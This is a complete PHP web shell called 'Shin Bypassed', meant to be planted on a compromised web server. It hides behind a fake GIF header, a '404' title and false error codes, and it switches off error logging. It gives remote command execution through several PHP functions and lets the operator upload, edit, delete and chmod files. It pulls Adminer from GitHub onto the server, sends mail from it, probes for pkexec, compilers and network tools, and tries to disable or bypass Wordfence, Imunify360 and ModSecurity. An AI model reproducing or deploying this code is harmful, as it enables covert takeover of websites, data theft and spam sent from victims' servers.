<?php
echo "<!-- GIF89;a -->\n";
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);
//Kalau file terbaca sebagai gambar hapus atas ^
//Shin Code - Created 15 July 2023
//jan di ganti ganti ntar error aoakwkwk
//Recode aja  banh penting ga cuma ganti copyright :')
function getFileDetails($path)
{
    $folders = [];
    $files = [];

    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }

        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function formatSize($size)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}
//cmd fitur
function executeCommand($command)
{
    $currentDirectory = getCurrentDirectory();
    $command = "cd $currentDirectory && $command";

    $output = '';
    $error = '';

    // proc_open
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = @proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        $returnValue = proc_close($process);

        $output = trim($output);
        $error = trim($error);

        if ($returnValue === 0 && !empty($output)) {
            return $output;
        } elseif (!empty($error)) {
            return 'Error: ' . $error;
        }
    }

    // shell_exec
    $shellOutput = @shell_exec($command);
    if ($shellOutput !== null) {
        $output = trim($shellOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        $error = error_get_last();
        if (!empty($error)) {
            return 'Error: ' . $error['message'];
        }
    }

    // exec
    @exec($command, $execOutput, $execStatus);
    if ($execStatus === 0) {
        $output = implode(PHP_EOL, $execOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // passthru
    ob_start();
    @passthru($command, $passthruStatus);
    $passthruOutput = ob_get_clean();
    if ($passthruStatus === 0) {
        $output = $passthruOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    // system
    ob_start();
    @system($command, $systemStatus);
    $systemOutput = ob_get_clean();
    if ($systemStatus === 0) {
        $output = $systemOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }

    return 'Error: Command execution failed.';
}
function readFileContent($file)
{
    return file_get_contents($file);
}

function saveFileContent($file)
{
    if (isset($_POST['content'])) {
        return file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}
//upfile
function uploadFile($targetDirectory)
{
    if (isset($_FILES['file'])) {
        $currentDirectory = getCurrentDirectory();
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) {
            return 'Open Ur Eyes Bitch !!!.';
        } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return 'File uploaded successfully.';
        } else {
            return 'Error uploading file.';
        }
    }
    return '';
}
}
//dir
function changeDirectory($path)
{
    if ($path === '..') {
        @chdir('..');
    } else {
        @chdir($path);
    }
}

function getCurrentDirectory()
{
    return realpath(getcwd());
}

//open file juga folder
function getLink($path, $name)
{
    if (is_dir($path)) {
        return '<a href="?dir=' . urlencode($path) . '">' . $name . '</a>';
    } elseif (is_file($path)) {
        return '<a href="?dir=' . urlencode(dirname($path)) . '&amp;read=' . urlencode($path) . '">' . $name . '</a>';

    }
}
function getDirectoryArray($path)
{
    $directories = explode('/', $path);
    $directoryArray = [];
    $currentPath = '';
    foreach ($directories as $directory) {
        if (!empty($directory)) {
            $currentPath .= '/' . $directory;
            $directoryArray[] = [
                'path' => $currentPath,
                'name' => $directory,
            ];
        }
    }
    return $directoryArray;
}


function showBreadcrumb($path)
{
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    ?>
    <div class="breadcrumb">
        <?php foreach ($paths as $id => $pat) { ?>
            <?php if ($pat == '' && $id == 0) { ?>
             DIR : <a href="?dir=/">/</a>
            <?php } ?>
            <?php if ($pat == '') {
                continue;
            } ?>
            <?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
            <a href="?dir=<?php echo urlencode($linkPath); ?>"><?php echo $pat; ?></a>/
        <?php } ?>
    </div>
    <?php
}


//tabel biar keren
function showFileTable($path)
{
    $fileDetails = getFileDetails($path);
    ?>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        <?php if (is_array($fileDetails)) { ?>
            <?php foreach ($fileDetails as $fileDetail) { ?>
                <tr>
                    <td><?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
                    
                    <td><?php echo $fileDetail['type']; ?></td>
                    <td><?php echo $fileDetail['size']; ?></td>
                    <td>
                        <?php
                        $permissionColor = is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';
                        ?>
                        <span style="color: <?php echo $permissionColor; ?>"><?php echo $fileDetail['permission']; ?></span>
                        </td>
                    <td>
                            
                        <?php if ($fileDetail['type'] === 'File') { ?>
                            <div class="dropdown">
                                <button class="dropbtn">Actions</button>
                                <div class="dropdown-content">
                                    <a href="?dir=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Edit</a>
                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
                                 </div>
                               </div>
                        <?php } ?>
                        <?php if ($fileDetail['type'] === 'Folder') { ?>
                            <div class="dropdown">
                                <button class="dropbtn">Actions</button>
                                <div class="dropdown-content">
                                    <a href="?dir=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>">Rename</a>
                                    <a href="?dir=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>">Chmod</a>
                                    <a href="?dir=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>">Delete</a>
                                </div>
                             </div>
                        <?php } ?>
                    </td>
                </tr>
            <?php } ?>
        <?php } else { ?>
            <tr>
                <td colspan="5">None</td>
            </tr>
        <?php } ?>
    </table>
    <?php
}
//chmod
function changePermission($path)
{
    if (!file_exists($path)) {
        return 'File or directory does not exist.';
    }

    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
    
    if ($permission === '') {
        return 'Invalid permission value.';
    }

    if (!is_dir($path) && !is_file($path)) {
        return 'Cannot change permission. Only directories and files can have permissions modified.';
    }

    $parsedPermission = intval($permission, 8);
    if ($parsedPermission === 0) {
        return 'Invalid permission value.';
    }

    if (chmodRecursive($path, $parsedPermission)) {
        return 'Permission changed successfully.';
    } else {
        return 'Error changing permission.';
    }
}


function chmodRecursive($path, $permission)
{
    if (is_dir($path)) {
        $items = scandir($path);
        if ($items === false) {
            return false;
        }

        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }

                if (!chmodRecursive($itemPath, $permission)) {
                    return false;
                }
            } else {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }
            }
        }
    } else {
        if (!chmod($path, $permission)) {
            return false;
        }
    }

    return true;
}

//rename
function renameFile($oldName, $newName)
{
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (rename($oldName, $newPath)) {
            return 'File or folder renamed successfully.';
        } else {
            return 'Error renaming file or folder.';
        }
    } else {
        return 'File or folder does not exist.';
    }
}

//delete
function deleteFile($file)
{
    if (file_exists($file)) {
        if (unlink($file)) {
            return 'File deleted successfully.' . $file;
        } else {
            return 'Error deleting file.';
        }
    } else {
        return 'File does not exist.';
    }
}

function deleteFolder($folder)
{
    if (is_dir($folder)) {
        $files = glob($folder . '/*');
        foreach ($files as $file) {
            is_dir($file) ? deleteFolder($file) : unlink($file);
        }
        if (rmdir($folder)) {
            return 'Folder deleted successfully.' . $folder;
        } else {
            return 'Error deleting folder.';
        }
    } else {
        return 'Folder does not exist.';
    }
}
//main logic directory 
$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';

if (isset($_GET['dir'])) {
    changeDirectory($_GET['dir']);
    $currentDirectory = getCurrentDirectory();
}
//edit
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $saved = saveFileContent($file);
        if ($saved) {
            $responseMessage = 'File saved successfully.' . $file;
        } else {
            $errorMessage = 'Error saving file.';
        }
    }
}

if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $responseMessage = changePermission($file);
    }
}

if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}

if (isset($_POST['cmd'])) {
    $cmdOutput = executeCommand($_POST['cmd']);
}

if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = $_POST['new_name'];
        if (is_file($file) || is_dir($file)) {
            $responseMessage = renameFile($file, $newName);
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $currentDirectory = getCurrentDirectory();
        if (is_file($file)) {
            $responseMessage = deleteFile($file);
            echo "<script>alert('File dihapus');window.location='?dir=" . urlencode($currentDirectory) . "';</script>";
            exit;
        } elseif (is_dir($file)) {
            $responseMessage = deleteFolder($file);
            echo "<script>alert('Folder dihapus');window.location='?dir=" . urlencode($currentDirectory) . "';</script>";
            exit;
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}
//panggil adminer
if (isset($_POST['Summon'])) {
    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $currentPath = getCurrentDirectory();

    $fileUrl = $baseUrl;
    $fileName = 'Adminer.php';

    $filePath = $currentPath . '/' . $fileName;

    $fileContent = @file_get_contents($fileUrl);
    if ($fileContent !== false) {
        if (file_put_contents($filePath, $fileContent) !== false) {
     
            $responseMessage = 'File "' . $fileName . '" summoned successfully. <a href="' . $filePath . '">' . $filePath . '</a>';            
        } else {
            $errorMessage = 'Failed to save the summoned file.';
        }
    } else {
        $errorMessage = 'Failed to fetch the file content. None File';
    }
}
// katanya bypass
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}


if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>404</title>
  <link rel="stylesheet" href="https://rawcdn.githack.com/Jenderal92/Blog-Gan/63073e604b81df6337c1917990a7330d46b22ae9/ganteng.css">  
</head>
<body>
    <div class="container">
        <h1>[ Shin Bypassed ]</h1>
        <div class="menu-icon" onclick="toggleSidebar()"></div>
        <hr>
        <div class="button-container">
            <form method="post" style="display: inline-block;">
                <input type="submit" name="Summon" value="Adminer" class="summon-button">
            </form>
            <button type="button" onclick="window.location.href='?gas'" class="summon-button">Mail Test</button>
        </div>
        

        <?php
        //mailer
        if (isset($_GET['gas'])) {
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                if (!empty($_POST['email'])) {
                    $xx = rand();
                    if (mail($_POST['email'], "Shin Mailer Test - " . $xx, "Shin Ganteng")) {
                        echo "<b>Send a report to [" . $_POST['email'] . "] - $xx</b>";
                    } else {
                        echo "Failed to send the email.";
                    }
                } else {
                    echo "Please provide an email address.";
                }
            } else {
        ?>
                <h2>Mail Test :</h2>
                <form method="post">
                    <input type="text" name="email" placeholder="Enter email" required>
                    <input type="submit" value="Send test &raquo;">
                </form>
        <?php
            }
        }
        ?>

        <?php if (!empty($errorMessage)) { ?>
            <p style="color: red;"><?php echo $errorMessage; ?></p>
        <?php } ?>

        <hr>

        <div class="upload-cmd-container">
            <div class="upload-form">
                <h2>Upload:</h2>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="file">
                    <button class="button" type="submit" name="upload">Upload</button>
                </form>
            </div>

            <div class="cmd-form">
                <h2>Command:</h2>
                <form method="post">
                    <?php echo @get_current_user() . "@" . @$_SERVER['REMOTE_ADDR'] . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd'>
                    <input type="submit" class="empty-button">

                </form>
            </div>
        </div>
        <?php
        if (isset($_GET['read'])) {
            $file = $_GET['read'];
            $content = readFileContent($file);
            if ($content !== false) {
                echo '<div class="command-output">';
                echo '<pre>' . htmlspecialchars($content) . '</pre>';
                echo '</div>';
            } else {
                echo 'Failed to read the file.';
                }
              }
           ?>
        <?php if (!empty($cmdOutput)) { ?>
            <h3>Command Output:</h3>
            <div class="command-output">
                <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
            </div>
        <?php } ?>

        <?php if (!empty($responseMessage)) { ?>
            <p class="response-message" style="color: green;"><?php echo $responseMessage; ?></p>
        <?php } ?>            
        <?php if (isset($_GET['rename'])) { ?>
        <div class="rename-form">
            <h2>Rename File or Folder: <?php echo basename($file); ?></h2>
            <form method="post">
                <input type="text" name="new_name" placeholder="New Name" required>
                <br>
                <input type="submit" value="Rename" class="button">
                <a href="?dir=<?php echo urlencode(dirname($file)); ?>" class="button">Cancel</a>
            </form>
        </div>
        <?php } ?>
        <?php if (isset($_GET['edit'])) { ?>
            <div class="edit-file">
                <h2>Edit File: <?php echo basename($file); ?></h2>
                <form method="post">
                    <textarea name="content" rows="10" cols="50"><?php echo htmlspecialchars($content); ?></textarea><br>
                    <button class="button" type="submit">Save</button>
                </form>
            </div>
        <?php } elseif (isset($_GET['chmod'])) { ?>
            <div class="change-permission">
                <h2>Change Permission: <?php echo basename($file); ?></h2>
                <form method="post">
                    <input type="hidden" name="chmod" value="<?php echo urlencode($file); ?>">
                    <input type="text" name="permission" placeholder="Enter permission (e.g., 0770)">
                    <button class="button" type="submit">Change</button>
                </form>
            </div>
        <?php } ?>
        <hr>

        <?php
        echo '<h2>Filemanager</h2>';
        showBreadcrumb($currentDirectory);
        showFileTable($currentDirectory);
        ?>
    </div>
<div class="sidebar" id="sidebar">
    <div class="sidebar-content">
        <div class="sidebar-close">
            <button onclick="toggleSidebar()">Close</button>
        </div>
        <div class="info-container">
            <h2>Server Info</h2>
            <?php
            function countDomainsInServer()
            {
                $serverName = $_SERVER['SERVER_NAME'];
                $ipAddresses = @gethostbynamel($serverName);

                if ($ipAddresses !== false) {
                    return count($ipAddresses);
                } else {
                    return 0;
                }
            }

            $domainCount = @countDomainsInServer();

            function formatBytes($bytes, $precision = 2)
            {
                $units = array('B', 'KB', 'MB', 'GB', 'TB');

                $bytes = max($bytes, 0);
                $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                $pow = min($pow, count($units) - 1);

                $bytes /= (1 << (10 * $pow));

                return round($bytes, $precision) . ' ' . $units[$pow];
            }
            ?>

            <ul class="info-list">
                <li>Hostname: <?php echo @gethostname(); ?></li>
                <?php if (isset($_SERVER['SERVER_ADDR'])) : ?>
                    <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                <?php endif; ?>
                <li>PHP Version: <?php echo @phpversion(); ?></li>
                <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                <?php if (function_exists('disk_total_space')) : ?>
                    <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
                    <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
                <?php endif; ?>
                <li>Total Domains in Server: <?php echo $domainCount; ?></li>
                <li>System: <?php echo @php_uname(); ?></li>
            </ul>
        </div>

        <div class="info-container">
            <h2>System Info</h2>
            <ul class="info-list">
                <?php
                $features = [
                    'Safe Mode' => ini_get('safe_mode') ? 'Enabled' : 'Disabled',
                    'Disable Functions' => ini_get('disable_functions'),
                    'GCC' => function_exists('shell_exec') && shell_exec('gcc --version') ? 'On' : 'Off',
                    'Perl' => function_exists('shell_exec') && shell_exec('perl --version') ? 'On' : 'Off',
                    'Python Version' => ($pythonVersion = shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
                    'PKEXEC Version' => ($pkexecVersion = shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
                    'Curl' => function_exists('shell_exec') && shell_exec('curl --version') ? 'On' : 'Off',
                    'Wget' => function_exists('shell_exec') && shell_exec('wget --version') ? 'On' : 'Off',
                    'Mysql' => function_exists('shell_exec') && shell_exec('mysql --version') ? 'On' : 'Off',
                    'Ftp' => function_exists('shell_exec') && shell_exec('ftp --version') ? 'On' : 'Off',
                    'Ssh' => function_exists('shell_exec') && shell_exec('ssh --version') ? 'On' : 'Off',
                    'Mail' => function_exists('shell_exec') && shell_exec('mail --version') ? 'On' : 'Off',
                    'cron' => function_exists('shell_exec') && shell_exec('cron --version') ? 'On' : 'Off',
                    'SendMail' => function_exists('shell_exec') && shell_exec('sendmail --version') ? 'On' : 'Off',
                ];
                ?>

                <label for="feature-select">Select Feature:</label>
                <select id="feature-select">
                    <?php foreach ($features as $feature => $status) : ?>
                        <option value="<?php echo $feature; ?>"><?php echo $feature . ': ' . $status; ?></option>
                    <?php endforeach; ?>
                </select>
            </ul>
        </div>

        <div class="info-container">
            <h2>User Info</h2>
            <ul class="info-list">
                <li>Username: <?php echo @get_current_user(); ?></li>
                <li>User ID: <?php echo @getmyuid(); ?></li>
                <li>Group ID: <?php echo @getmygid(); ?></li>
            </ul>
        </div>
    </div>
</div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }
        
        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
<div class="footer">
    <p>&copy; <?php echo date("Y"); ?> <a href="https://www.blog-gan.org/">Coded By</a> Shin Code.</p>
</div>
</body>
</html>
